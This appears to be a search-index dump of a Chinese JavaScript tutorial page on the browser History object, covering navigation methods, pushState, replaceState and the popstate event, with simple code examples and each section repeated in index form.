\u00b6 \u6982\u8ff0 \u00b6 window.history \u5c5e\u6027\u6307\u5411 History \u5bf9\u8c61\uff0c\u5b83\u8868\u793a\u5f53\u524d\u7a97\u53e3\u7684\u6d4f\u89c8\u5386\u53f2\u3002 History \u5bf9\u8c61\u4fdd\u5b58\u4e86\u5f53\u524d\u7a97\u53e3\u8bbf\u95ee\u8fc7\u7684\u6240\u6709\u9875\u9762\u7f51\u5740\u3002\u4e0b\u9762\u4ee3\u7801\u8868\u793a\u5f53\u524d\u7a97\u53e3\u4e00\u5171\u8bbf\u95ee\u8fc73\u4e2a\u7f51\u5740\u3002 1 window . history . length // 3 \u7531\u4e8e\u5b89\u5168\u539f\u56e0\uff0c\u6d4f\u89c8\u5668\u4e0d\u5141\u8bb8\u811a\u672c\u8bfb\u53d6\u8fd9\u4e9b\u5730\u5740\uff0c\u4f46\u662f\u5141\u8bb8\u5728\u5730\u5740\u4e4b\u95f4\u5bfc\u822a\u3002 1 2 3 4 5 // \u540e\u9000\u5230\u524d\u4e00\u4e2a\u7f51\u5740 history . back () // \u7b49\u540c\u4e8e history . go ( - 1 ) \u6d4f\u89c8\u5668\u5de5\u5177\u680f\u7684\u201c\u524d\u8fdb\u201d\u548c\u201c\u540e\u9000\u201d\u6309\u94ae\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9 History \u5bf9\u8c61\u8fdb\u884c\u64cd\u4f5c\u3002 \u5c5e\u6027 \u00b6 History \u5bf9\u8c61\u4e3b\u8981\u6709\u4e24\u4e2a\u5c5e\u6027\u3002 History.length \uff1a\u5f53\u524d\u7a97\u53e3\u8bbf\u95ee\u8fc7\u7684\u7f51\u5740\u6570\u91cf\uff08\u5305\u62ec\u5f53\u524d\u7f51\u9875\uff09 History.state \uff1aHistory \u5806\u6808\u6700\u4e0a\u5c42\u7684\u72b6\u6001\u503c\uff08\u8be6\u89c1\u4e0b\u6587\uff09 1 2 3 4 5 6 // \u5f53\u524d\u7a97\u53e3\u8bbf\u95ee\u8fc7\u591a\u5c11\u4e2a\u7f51\u9875 window . history . length // 1 // History \u5bf9\u8c61\u7684\u5f53\u524d\u72b6\u6001 // \u901a\u5e38\u662f undefined\uff0c\u5373\u672a\u8bbe\u7f6e window . history . state // undefined \u65b9\u6cd5 \u00b6 History.back()\u3001History.forward()\u3001History.go() \u00b6 \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u7528\u4e8e\u5728\u5386\u53f2\u4e4b\u4e2d\u79fb\u52a8\u3002 History.back() \uff1a\u79fb\u52a8\u5230\u4e0a\u4e00\u4e2a\u7f51\u5740\uff0c\u7b49\u540c\u4e8e\u70b9\u51fb\u6d4f\u89c8\u5668\u7684\u540e\u9000\u952e\u3002\u5bf9\u4e8e\u7b2c\u4e00\u4e2a\u8bbf\u95ee\u7684\u7f51\u5740\uff0c\u8be5\u65b9\u6cd5\u65e0\u6548\u679c\u3002 History.forward() \uff1a\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u7f51\u5740\uff0c\u7b49\u540c\u4e8e\u70b9\u51fb\u6d4f\u89c8\u5668\u7684\u524d\u8fdb\u952e\u3002\u5bf9\u4e8e\u6700\u540e\u4e00\u4e2a\u8bbf\u95ee\u7684\u7f51\u5740\uff0c\u8be5\u65b9\u6cd5\u65e0\u6548\u679c\u3002 History.go() \uff1a\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u4ee5\u5f53\u524d\u7f51\u5740\u4e3a\u57fa\u51c6\uff0c\u79fb\u52a8\u5230\u53c2\u6570\u6307\u5b9a\u7684\u7f51\u5740\uff0c\u6bd4\u5982 go(1) \u76f8\u5f53\u4e8e forward() \uff0c go(-1) \u76f8\u5f53\u4e8e back() \u3002\u5982\u679c\u53c2\u6570\u8d85\u8fc7\u5b9e\u9645\u5b58\u5728\u7684\u7f51\u5740\u8303\u56f4\uff0c\u8be5\u65b9\u6cd5\u65e0\u6548\u679c\uff1b\u5982\u679c\u4e0d\u6307\u5b9a\u53c2\u6570\uff0c\u9ed8\u8ba4\u53c2\u6570\u4e3a 0 \uff0c\u76f8\u5f53\u4e8e\u5237\u65b0\u5f53\u524d\u9875\u9762\u3002 1 2 3 history . back (); history . forward (); history . go ( - 2 ); history.go(0) \u76f8\u5f53\u4e8e\u5237\u65b0\u5f53\u524d\u9875\u9762\u3002 1 history . go ( 0 ); // \u5237\u65b0\u5f53\u524d\u9875\u9762 \u6ce8\u610f\uff0c\u79fb\u52a8\u5230\u4ee5\u524d\u8bbf\u95ee\u8fc7\u7684\u9875\u9762\u65f6\uff0c\u9875\u9762\u901a\u5e38\u662f\u4ece\u6d4f\u89c8\u5668\u7f13\u5b58\u4e4b\u4e2d\u52a0\u8f7d\uff0c\u800c\u4e0d\u662f\u91cd\u65b0\u8981\u6c42\u670d\u52a1\u5668\u53d1\u9001\u65b0\u7684\u7f51\u9875\u3002 History.pushState() \u00b6 History.pushState() \u65b9\u6cd5\u7528\u4e8e\u5728\u5386\u53f2\u4e2d\u6dfb\u52a0\u4e00\u6761\u8bb0\u5f55\u3002 1 window . history . pushState ( state , title , url ) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b21\u4e3a\uff1a state \uff1a\u4e00\u4e2a\u4e0e\u6dfb\u52a0\u7684\u8bb0\u5f55\u76f8\u5173\u8054\u7684\u72b6\u6001\u5bf9\u8c61\uff0c\u4e3b\u8981\u7528\u4e8e popstate \u4e8b\u4ef6\u3002\u8be5\u4e8b\u4ef6\u89e6\u53d1\u65f6\uff0c\u8be5\u5bf9\u8c61\u4f1a\u4f20\u5165\u56de\u8c03\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6d4f\u89c8\u5668\u4f1a\u5c06\u8fd9\u4e2a\u5bf9\u8c61\u5e8f\u5217\u5316\u4ee5\u540e\u4fdd\u7559\u5728\u672c\u5730\uff0c\u91cd\u65b0\u8f7d\u5165\u8fd9\u4e2a\u9875\u9762\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u62ff\u5230\u8fd9\u4e2a\u5bf9\u8c61\u3002\u5982\u679c\u4e0d\u9700\u8981\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u6b64\u5904\u53ef\u4ee5\u586b null \u3002 title \uff1a\u65b0\u9875\u9762\u7684\u6807\u9898\u3002\u4f46\u662f\uff0c\u73b0\u5728\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u5ffd\u89c6\u8fd9\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u586b\u7a7a\u5b57\u7b26\u4e32\u3002 url \uff1a\u65b0\u7684\u7f51\u5740\uff0c\u5fc5\u987b\u4e0e\u5f53\u524d\u9875\u9762\u5904\u5728\u540c\u4e00\u4e2a\u57df\u3002\u6d4f\u89c8\u5668\u7684\u5730\u5740\u680f\u5c06\u663e\u793a\u8fd9\u4e2a\u7f51\u5740\u3002 \u5047\u5b9a\u5f53\u524d\u7f51\u5740\u662f example.com/1.html \uff0c\u4f7f\u7528 pushState() \u65b9\u6cd5\u5728\u6d4f\u89c8\u8bb0\u5f55\uff08History \u5bf9\u8c61\uff09\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u65b0\u8bb0\u5f55\u3002 1 2 var stateObj = { foo : 'bar' }; history . pushState ( stateObj , 'page 2' , '2.html' ); \u6dfb\u52a0\u65b0\u8bb0\u5f55\u540e\uff0c\u6d4f\u89c8\u5668\u5730\u5740\u680f\u7acb\u523b\u663e\u793a example.com/2.html \uff0c\u4f46\u5e76\u4e0d\u4f1a\u8df3\u8f6c\u5230 2.html \uff0c\u751a\u81f3\u4e5f\u4e0d\u4f1a\u68c0\u67e5 2.html \u662f\u5426\u5b58\u5728\uff0c\u5b83\u53ea\u662f\u6210\u4e3a\u6d4f\u89c8\u5386\u53f2\u4e2d\u7684\u6700\u65b0\u8bb0\u5f55\u3002\u8fd9\u65f6\uff0c\u5728\u5730\u5740\u680f\u8f93\u5165\u4e00\u4e2a\u65b0\u7684\u5730\u5740(\u6bd4\u5982\u8bbf\u95ee google.com )\uff0c\u7136\u540e\u70b9\u51fb\u4e86\u5012\u9000\u6309\u94ae\uff0c\u9875\u9762\u7684 URL \u5c06\u663e\u793a 2.html \uff1b\u4f60\u518d\u70b9\u51fb\u4e00\u6b21\u5012\u9000\u6309\u94ae\uff0cURL \u5c06\u663e\u793a 1.html \u3002 \u603b\u4e4b\uff0c pushState() \u65b9\u6cd5\u4e0d\u4f1a\u89e6\u53d1\u9875\u9762\u5237\u65b0\uff0c\u53ea\u662f\u5bfc\u81f4 History \u5bf9\u8c61\u53d1\u751f\u53d8\u5316\uff0c\u5730\u5740\u680f\u4f1a\u6709\u53cd\u5e94\u3002 \u4f7f\u7528\u8be5\u65b9\u6cd5\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u7528 History.state \u5c5e\u6027\u8bfb\u51fa\u72b6\u6001\u5bf9\u8c61\u3002 1 2 3 var stateObj = { foo : 'bar' }; history . pushState ( stateObj , 'page 2' , '2.html' ); history . state // {foo: \"bar\"} \u5982\u679c pushState \u7684 URL \u53c2\u6570\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u65b0\u7684\u951a\u70b9\u503c\uff08\u5373 hash \uff09\uff0c\u5e76\u4e0d\u4f1a\u89e6\u53d1 hashchange \u4e8b\u4ef6\u3002\u53cd\u8fc7\u6765\uff0c\u5982\u679c URL \u7684\u951a\u70b9\u503c\u53d8\u4e86\uff0c\u5219\u4f1a\u5728 History \u5bf9\u8c61\u521b\u5efa\u4e00\u6761\u6d4f\u89c8\u8bb0\u5f55\u3002 \u5982\u679c pushState() \u65b9\u6cd5\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u8de8\u57df\u7f51\u5740\uff0c\u5219\u4f1a\u62a5\u9519\u3002 1 2 3 // \u62a5\u9519 // \u5f53\u524d\u7f51\u5740\u4e3a http://example.com history . pushState ( null , '' , 'https://twitter.com/hello' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c pushState \u60f3\u8981\u63d2\u5165\u4e00\u4e2a\u8de8\u57df\u7684\u7f51\u5740\uff0c\u5bfc\u81f4\u62a5\u9519\u3002\u8fd9\u6837\u8bbe\u8ba1\u7684\u76ee\u7684\u662f\uff0c\u9632\u6b62\u6076\u610f\u4ee3\u7801\u8ba9\u7528\u6237\u4ee5\u4e3a\u4ed6\u4eec\u662f\u5728\u53e6\u4e00\u4e2a\u7f51\u7ad9\u4e0a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u4f1a\u5bfc\u81f4\u9875\u9762\u8df3\u8f6c\u3002 History.replaceState() \u00b6 History.replaceState() \u65b9\u6cd5\u7528\u6765\u4fee\u6539 History \u5bf9\u8c61\u7684\u5f53\u524d\u8bb0\u5f55\uff0c\u5176\u4ed6\u90fd\u4e0e pushState() \u65b9\u6cd5\u4e00\u6a21\u4e00\u6837\u3002 \u5047\u5b9a\u5f53\u524d\u7f51\u9875\u662f example.com/example.html \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 history . pushState ({ page : 1 }, 'title 1' , '?page=1' ) // URL \u663e\u793a\u4e3a http://example.com/example.html?page=1 history . pushState ({ page : 2 }, 'title 2' , '?page=2' ); // URL \u663e\u793a\u4e3a http://example.com/example.html?page=2 history . replaceState ({ page : 3 }, 'title 3' , '?page=3' ); // URL \u663e\u793a\u4e3a http://example.com/example.html?page=3 history . back () // URL \u663e\u793a\u4e3a http://example.com/example.html?page=1 history . back () // URL \u663e\u793a\u4e3a http://example.com/example.html history . go ( 2 ) // URL \u663e\u793a\u4e3a http://example.com/example.html?page=3 popstate \u4e8b\u4ef6 \u00b6 \u6bcf\u5f53\u540c\u4e00\u4e2a\u6587\u6863\u7684\u6d4f\u89c8\u5386\u53f2\uff08\u5373 history \u5bf9\u8c61\uff09\u51fa\u73b0\u53d8\u5316\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1 popstate \u4e8b\u4ef6\u3002 \u6ce8\u610f\uff0c\u4ec5\u4ec5\u8c03\u7528 pushState() \u65b9\u6cd5\u6216 replaceState() \u65b9\u6cd5 \uff0c\u5e76\u4e0d\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\uff0c\u53ea\u6709\u7528\u6237\u70b9\u51fb\u6d4f\u89c8\u5668\u5012\u9000\u6309\u94ae\u548c\u524d\u8fdb\u6309\u94ae\uff0c\u6216\u8005\u4f7f\u7528 JavaScript \u8c03\u7528 History.back() \u3001 History.forward() \u3001 History.go() \u65b9\u6cd5\u65f6\u624d\u4f1a\u89e6\u53d1\u3002\u53e6\u5916\uff0c\u8be5\u4e8b\u4ef6\u53ea\u9488\u5bf9\u540c\u4e00\u4e2a\u6587\u6863\uff0c\u5982\u679c\u6d4f\u89c8\u5386\u53f2\u7684\u5207\u6362\uff0c\u5bfc\u81f4\u52a0\u8f7d\u4e0d\u540c\u7684\u6587\u6863\uff0c\u8be5\u4e8b\u4ef6\u4e5f\u4e0d\u4f1a\u89e6\u53d1\u3002 \u4f7f\u7528\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4e3a popstate \u4e8b\u4ef6\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 window . onpopstate = function ( event ) { console . log ( 'location: ' + document . location ); console . log ( 'state: ' + JSON . stringify ( event . state )); }; // \u6216\u8005 window . addEventListener ( 'popstate' , function ( event ) { console . log ( 'location: ' + document . location ); console . log ( 'state: ' + JSON . stringify ( event . state )); }); \u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a event \u4e8b\u4ef6\u5bf9\u8c61\uff0c\u5b83\u7684 state \u5c5e\u6027\u6307\u5411 pushState \u548c replaceState \u65b9\u6cd5\u4e3a\u5f53\u524d URL \u6240\u63d0\u4f9b\u7684\u72b6\u6001\u5bf9\u8c61\uff08\u5373\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff09\u3002\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684 event.state \uff0c\u5c31\u662f\u901a\u8fc7 pushState \u548c replaceState \u65b9\u6cd5\uff0c\u4e3a\u5f53\u524d URL \u7ed1\u5b9a\u7684 state \u5bf9\u8c61\u3002 \u8fd9\u4e2a state \u5bf9\u8c61\u4e5f\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 history \u5bf9\u8c61\u8bfb\u53d6\u3002 1 var currentState = history . state ; \u6ce8\u610f\uff0c\u9875\u9762\u7b2c\u4e00\u6b21\u52a0\u8f7d\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u4e0d\u4f1a\u89e6\u53d1 popstate \u4e8b\u4ef6\u3002","title":"History \u5bf9\u8c61"},{"location":"bom/history/#history","text":"","title":"History \u5bf9\u8c61"},{"location":"bom/history/#_1","text":"window.history \u5c5e\u6027\u6307\u5411 History \u5bf9\u8c61\uff0c\u5b83\u8868\u793a\u5f53\u524d\u7a97\u53e3\u7684\u6d4f\u89c8\u5386\u53f2\u3002 History \u5bf9\u8c61\u4fdd\u5b58\u4e86\u5f53\u524d\u7a97\u53e3\u8bbf\u95ee\u8fc7\u7684\u6240\u6709\u9875\u9762\u7f51\u5740\u3002\u4e0b\u9762\u4ee3\u7801\u8868\u793a\u5f53\u524d\u7a97\u53e3\u4e00\u5171\u8bbf\u95ee\u8fc73\u4e2a\u7f51\u5740\u3002 1 window . history . length // 3 \u7531\u4e8e\u5b89\u5168\u539f\u56e0\uff0c\u6d4f\u89c8\u5668\u4e0d\u5141\u8bb8\u811a\u672c\u8bfb\u53d6\u8fd9\u4e9b\u5730\u5740\uff0c\u4f46\u662f\u5141\u8bb8\u5728\u5730\u5740\u4e4b\u95f4\u5bfc\u822a\u3002 1 2 3 4 5 // \u540e\u9000\u5230\u524d\u4e00\u4e2a\u7f51\u5740 history . back () // \u7b49\u540c\u4e8e history . go ( - 1 ) \u6d4f\u89c8\u5668\u5de5\u5177\u680f\u7684\u201c\u524d\u8fdb\u201d\u548c\u201c\u540e\u9000\u201d\u6309\u94ae\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9 History \u5bf9\u8c61\u8fdb\u884c\u64cd\u4f5c\u3002","title":"\u6982\u8ff0"},{"location":"bom/history/#_2","text":"History \u5bf9\u8c61\u4e3b\u8981\u6709\u4e24\u4e2a\u5c5e\u6027\u3002 History.length \uff1a\u5f53\u524d\u7a97\u53e3\u8bbf\u95ee\u8fc7\u7684\u7f51\u5740\u6570\u91cf\uff08\u5305\u62ec\u5f53\u524d\u7f51\u9875\uff09 History.state \uff1aHistory \u5806\u6808\u6700\u4e0a\u5c42\u7684\u72b6\u6001\u503c\uff08\u8be6\u89c1\u4e0b\u6587\uff09 1 2 3 4 5 6 // \u5f53\u524d\u7a97\u53e3\u8bbf\u95ee\u8fc7\u591a\u5c11\u4e2a\u7f51\u9875 window . history . length // 1 // History \u5bf9\u8c61\u7684\u5f53\u524d\u72b6\u6001 // \u901a\u5e38\u662f undefined\uff0c\u5373\u672a\u8bbe\u7f6e window . history . state // undefined","title":"\u5c5e\u6027"},{"location":"bom/history/#_3","text":"","title":"\u65b9\u6cd5"},{"location":"bom/history/#historybackhistoryforwardhistorygo","text":"\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u7528\u4e8e\u5728\u5386\u53f2\u4e4b\u4e2d\u79fb\u52a8\u3002 History.back() \uff1a\u79fb\u52a8\u5230\u4e0a\u4e00\u4e2a\u7f51\u5740\uff0c\u7b49\u540c\u4e8e\u70b9\u51fb\u6d4f\u89c8\u5668\u7684\u540e\u9000\u952e\u3002\u5bf9\u4e8e\u7b2c\u4e00\u4e2a\u8bbf\u95ee\u7684\u7f51\u5740\uff0c\u8be5\u65b9\u6cd5\u65e0\u6548\u679c\u3002 History.forward() \uff1a\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u7f51\u5740\uff0c\u7b49\u540c\u4e8e\u70b9\u51fb\u6d4f\u89c8\u5668\u7684\u524d\u8fdb\u952e\u3002\u5bf9\u4e8e\u6700\u540e\u4e00\u4e2a\u8bbf\u95ee\u7684\u7f51\u5740\uff0c\u8be5\u65b9\u6cd5\u65e0\u6548\u679c\u3002 History.go() \uff1a\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u4ee5\u5f53\u524d\u7f51\u5740\u4e3a\u57fa\u51c6\uff0c\u79fb\u52a8\u5230\u53c2\u6570\u6307\u5b9a\u7684\u7f51\u5740\uff0c\u6bd4\u5982 go(1) \u76f8\u5f53\u4e8e forward() \uff0c go(-1) \u76f8\u5f53\u4e8e back() \u3002\u5982\u679c\u53c2\u6570\u8d85\u8fc7\u5b9e\u9645\u5b58\u5728\u7684\u7f51\u5740\u8303\u56f4\uff0c\u8be5\u65b9\u6cd5\u65e0\u6548\u679c\uff1b\u5982\u679c\u4e0d\u6307\u5b9a\u53c2\u6570\uff0c\u9ed8\u8ba4\u53c2\u6570\u4e3a 0 \uff0c\u76f8\u5f53\u4e8e\u5237\u65b0\u5f53\u524d\u9875\u9762\u3002 1 2 3 history . back (); history . forward (); history . go ( - 2 ); history.go(0) \u76f8\u5f53\u4e8e\u5237\u65b0\u5f53\u524d\u9875\u9762\u3002 1 history . go ( 0 ); // \u5237\u65b0\u5f53\u524d\u9875\u9762 \u6ce8\u610f\uff0c\u79fb\u52a8\u5230\u4ee5\u524d\u8bbf\u95ee\u8fc7\u7684\u9875\u9762\u65f6\uff0c\u9875\u9762\u901a\u5e38\u662f\u4ece\u6d4f\u89c8\u5668\u7f13\u5b58\u4e4b\u4e2d\u52a0\u8f7d\uff0c\u800c\u4e0d\u662f\u91cd\u65b0\u8981\u6c42\u670d\u52a1\u5668\u53d1\u9001\u65b0\u7684\u7f51\u9875\u3002","title":"History.back()\u3001History.forward()\u3001History.go()"},{"location":"bom/history/#historypushstate","text":"History.pushState() \u65b9\u6cd5\u7528\u4e8e\u5728\u5386\u53f2\u4e2d\u6dfb\u52a0\u4e00\u6761\u8bb0\u5f55\u3002 1 window . history . pushState ( state , title , url ) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b21\u4e3a\uff1a state \uff1a\u4e00\u4e2a\u4e0e\u6dfb\u52a0\u7684\u8bb0\u5f55\u76f8\u5173\u8054\u7684\u72b6\u6001\u5bf9\u8c61\uff0c\u4e3b\u8981\u7528\u4e8e popstate \u4e8b\u4ef6\u3002\u8be5\u4e8b\u4ef6\u89e6\u53d1\u65f6\uff0c\u8be5\u5bf9\u8c61\u4f1a\u4f20\u5165\u56de\u8c03\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6d4f\u89c8\u5668\u4f1a\u5c06\u8fd9\u4e2a\u5bf9\u8c61\u5e8f\u5217\u5316\u4ee5\u540e\u4fdd\u7559\u5728\u672c\u5730\uff0c\u91cd\u65b0\u8f7d\u5165\u8fd9\u4e2a\u9875\u9762\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u62ff\u5230\u8fd9\u4e2a\u5bf9\u8c61\u3002\u5982\u679c\u4e0d\u9700\u8981\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u6b64\u5904\u53ef\u4ee5\u586b null \u3002 title \uff1a\u65b0\u9875\u9762\u7684\u6807\u9898\u3002\u4f46\u662f\uff0c\u73b0\u5728\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u5ffd\u89c6\u8fd9\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u586b\u7a7a\u5b57\u7b26\u4e32\u3002 url \uff1a\u65b0\u7684\u7f51\u5740\uff0c\u5fc5\u987b\u4e0e\u5f53\u524d\u9875\u9762\u5904\u5728\u540c\u4e00\u4e2a\u57df\u3002\u6d4f\u89c8\u5668\u7684\u5730\u5740\u680f\u5c06\u663e\u793a\u8fd9\u4e2a\u7f51\u5740\u3002 \u5047\u5b9a\u5f53\u524d\u7f51\u5740\u662f example.com/1.html \uff0c\u4f7f\u7528 pushState() \u65b9\u6cd5\u5728\u6d4f\u89c8\u8bb0\u5f55\uff08History \u5bf9\u8c61\uff09\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u65b0\u8bb0\u5f55\u3002 1 2 var stateObj = { foo : 'bar' }; history . pushState ( stateObj , 'page 2' , '2.html' ); \u6dfb\u52a0\u65b0\u8bb0\u5f55\u540e\uff0c\u6d4f\u89c8\u5668\u5730\u5740\u680f\u7acb\u523b\u663e\u793a example.com/2.html \uff0c\u4f46\u5e76\u4e0d\u4f1a\u8df3\u8f6c\u5230 2.html \uff0c\u751a\u81f3\u4e5f\u4e0d\u4f1a\u68c0\u67e5 2.html \u662f\u5426\u5b58\u5728\uff0c\u5b83\u53ea\u662f\u6210\u4e3a\u6d4f\u89c8\u5386\u53f2\u4e2d\u7684\u6700\u65b0\u8bb0\u5f55\u3002\u8fd9\u65f6\uff0c\u5728\u5730\u5740\u680f\u8f93\u5165\u4e00\u4e2a\u65b0\u7684\u5730\u5740(\u6bd4\u5982\u8bbf\u95ee google.com )\uff0c\u7136\u540e\u70b9\u51fb\u4e86\u5012\u9000\u6309\u94ae\uff0c\u9875\u9762\u7684 URL \u5c06\u663e\u793a 2.html \uff1b\u4f60\u518d\u70b9\u51fb\u4e00\u6b21\u5012\u9000\u6309\u94ae\uff0cURL \u5c06\u663e\u793a 1.html \u3002 \u603b\u4e4b\uff0c pushState() \u65b9\u6cd5\u4e0d\u4f1a\u89e6\u53d1\u9875\u9762\u5237\u65b0\uff0c\u53ea\u662f\u5bfc\u81f4 History \u5bf9\u8c61\u53d1\u751f\u53d8\u5316\uff0c\u5730\u5740\u680f\u4f1a\u6709\u53cd\u5e94\u3002 \u4f7f\u7528\u8be5\u65b9\u6cd5\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u7528 History.state \u5c5e\u6027\u8bfb\u51fa\u72b6\u6001\u5bf9\u8c61\u3002 1 2 3 var stateObj = { foo : 'bar' }; history . pushState ( stateObj , 'page 2' , '2.html' ); history . state // {foo: \"bar\"} \u5982\u679c pushState \u7684 URL \u53c2\u6570\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u65b0\u7684\u951a\u70b9\u503c\uff08\u5373 hash \uff09\uff0c\u5e76\u4e0d\u4f1a\u89e6\u53d1 hashchange \u4e8b\u4ef6\u3002\u53cd\u8fc7\u6765\uff0c\u5982\u679c URL \u7684\u951a\u70b9\u503c\u53d8\u4e86\uff0c\u5219\u4f1a\u5728 History \u5bf9\u8c61\u521b\u5efa\u4e00\u6761\u6d4f\u89c8\u8bb0\u5f55\u3002 \u5982\u679c pushState() \u65b9\u6cd5\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u8de8\u57df\u7f51\u5740\uff0c\u5219\u4f1a\u62a5\u9519\u3002 1 2 3 // \u62a5\u9519 // \u5f53\u524d\u7f51\u5740\u4e3a http://example.com history . pushState ( null , '' , 'https://twitter.com/hello' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c pushState \u60f3\u8981\u63d2\u5165\u4e00\u4e2a\u8de8\u57df\u7684\u7f51\u5740\uff0c\u5bfc\u81f4\u62a5\u9519\u3002\u8fd9\u6837\u8bbe\u8ba1\u7684\u76ee\u7684\u662f\uff0c\u9632\u6b62\u6076\u610f\u4ee3\u7801\u8ba9\u7528\u6237\u4ee5\u4e3a\u4ed6\u4eec\u662f\u5728\u53e6\u4e00\u4e2a\u7f51\u7ad9\u4e0a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u4f1a\u5bfc\u81f4\u9875\u9762\u8df3\u8f6c\u3002","title":"History.pushState()"},{"location":"bom/history/#historyreplacestate","text":"History.replaceState() \u65b9\u6cd5\u7528\u6765\u4fee\u6539 History \u5bf9\u8c61\u7684\u5f53\u524d\u8bb0\u5f55\uff0c\u5176\u4ed6\u90fd\u4e0e pushState() \u65b9\u6cd5\u4e00\u6a21\u4e00\u6837\u3002 \u5047\u5b9a\u5f53\u524d\u7f51\u9875\u662f example.com/example.html \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 history . pushState ({ page : 1 }, 'title 1' , '?page=1' ) // URL \u663e\u793a\u4e3a http://example.com/example.html?page=1 history . pushState ({ page : 2 }, 'title 2' , '?page=2' ); // URL \u663e\u793a\u4e3a http://example.com/example.html?page=2 history . replaceState ({ page : 3 }, 'title 3' , '?page=3' ); // URL \u663e\u793a\u4e3a http://example.com/example.html?page=3 history . back () // URL \u663e\u793a\u4e3a http://example.com/example.html?page=1 history . back () // URL \u663e\u793a\u4e3a http://example.com/example.html history . go ( 2 ) // URL \u663e\u793a\u4e3a http://example.com/example.html?page=3","title":"History.replaceState()"},{"location":"bom/history/#popstate","text":"\u6bcf\u5f53\u540c\u4e00\u4e2a\u6587\u6863\u7684\u6d4f\u89c8\u5386\u53f2\uff08\u5373 history \u5bf9\u8c61\uff09\u51fa\u73b0\u53d8\u5316\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1 popstate \u4e8b\u4ef6\u3002 \u6ce8\u610f\uff0c\u4ec5\u4ec5\u8c03\u7528 pushState() \u65b9\u6cd5\u6216 replaceState() \u65b9\u6cd5 \uff0c\u5e76\u4e0d\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\uff0c\u53ea\u6709\u7528\u6237\u70b9\u51fb\u6d4f\u89c8\u5668\u5012\u9000\u6309\u94ae\u548c\u524d\u8fdb\u6309\u94ae\uff0c\u6216\u8005\u4f7f\u7528 JavaScript \u8c03\u7528 History.back() \u3001 History.forward() \u3001 History.go() \u65b9\u6cd5\u65f6\u624d\u4f1a\u89e6\u53d1\u3002\u53e6\u5916\uff0c\u8be5\u4e8b\u4ef6\u53ea\u9488\u5bf9\u540c\u4e00\u4e2a\u6587\u6863\uff0c\u5982\u679c\u6d4f\u89c8\u5386\u53f2\u7684\u5207\u6362\uff0c\u5bfc\u81f4\u52a0\u8f7d\u4e0d\u540c\u7684\u6587\u6863\uff0c\u8be5\u4e8b\u4ef6\u4e5f\u4e0d\u4f1a\u89e6\u53d1\u3002 \u4f7f\u7528\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4e3a popstate \u4e8b\u4ef6\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 window . onpopstate = function ( event ) { console . log ( 'location: ' + document . location ); console . log ( 'state: ' + JSON . stringify ( event . state )); }; // \u6216\u8005 window . addEventListener ( 'popstate' , function ( event ) { console . log ( 'location: ' + document . location ); console . log ( 'state: ' + JSON . stringify ( event . state )); }); \u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e00\u4e2a event \u4e8b\u4ef6\u5bf9\u8c61\uff0c\u5b83\u7684 state \u5c5e\u6027\u6307\u5411 pushState \u548c replaceState \u65b9\u6cd5\u4e3a\u5f53\u524d URL \u6240\u63d0\u4f9b\u7684\u72b6\u6001\u5bf9\u8c61\uff08\u5373\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff09\u3002\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684 event.state \uff0c\u5c31\u662f\u901a\u8fc7 pushState \u548c replaceState \u65b9\u6cd5\uff0c\u4e3a\u5f53\u524d URL \u7ed1\u5b9a\u7684 state 